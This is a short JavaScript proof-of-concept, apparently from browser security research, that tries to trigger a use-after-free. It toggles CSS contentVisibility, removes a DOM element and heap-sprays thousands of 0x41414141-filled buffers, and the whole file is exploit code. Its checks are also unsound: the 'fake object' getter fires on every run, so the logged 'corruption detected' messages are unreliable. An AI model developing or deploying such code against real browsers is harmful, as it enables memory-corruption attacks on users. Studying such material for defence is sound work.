import { debug_log } from './module/utils.mjs';

const container = document.querySelector(".container");
let child = document.querySelector(".child");

function heapSpray() {
  const spray = [];
  const pattern = 0x41414141; // patrón "AAAA"
  
  // Objeto fake con getter para detectar acceso (simula corrupción)
  const fakeObj = {
    get triggered() {
      debug_log("⚠️ Fake object getter triggered — possible corruption detected!");
      return 42;
    }
  };

  for (let i = 0; i < 3000; i++) {
    let buffer = new ArrayBuffer(0x1000);
    let view = new Uint32Array(buffer);
    view.fill(pattern); // llenar con patrón
    spray.push(view);
  }
  
  // Insertamos el objeto fake en el spray (simulación)
  spray.push(fakeObj);

  debug_log("Heap spray with pattern and fake object completed.");
  return spray;
}

export function triggerUAF() {
  if (!container || !child) {
    debug_log("Missing container or child element.");
    return;
  }

  try {
    container.style.contentVisibility = "hidden";

    // Eliminamos el child y guardamos la referencia para test
    child.remove();

    setTimeout(() => {
      container.style.contentVisibility = "auto";
      const spray = heapSpray();

      // 1. Verificar si el child fue eliminado
      if (!document.querySelector(".child")) {
        debug_log("✅ .child element removed from DOM (memory possibly freed).");
      } else {
        debug_log("❌ .child element still in DOM.");
      }

      // 2. Intentar acceder al fakeObj para detectar si se ejecuta getter
      try {
        let val = spray[spray.length - 1].triggered;
        debug_log(`Fake object triggered getter returned: ${val}`);
      } catch(e) {
        debug_log("Error accessing fake object getter: " + e.message);
      }

      // 3. Intentar acceder al primer bloque de spray para detectar patrón
      if (spray.length > 0 && spray[0][0] === 0x41414141) {
        debug_log("Heap spray pattern detected in first buffer.");
      } else {
        debug_log("Heap spray pattern NOT detected in first buffer.");
      }

      debug_log("UAF triggered. Check for crash or memory corruption.");

    }, 0);

  } catch(e) {
    debug_log("Exception caught during triggerUAF: " + e.message);
  }
}
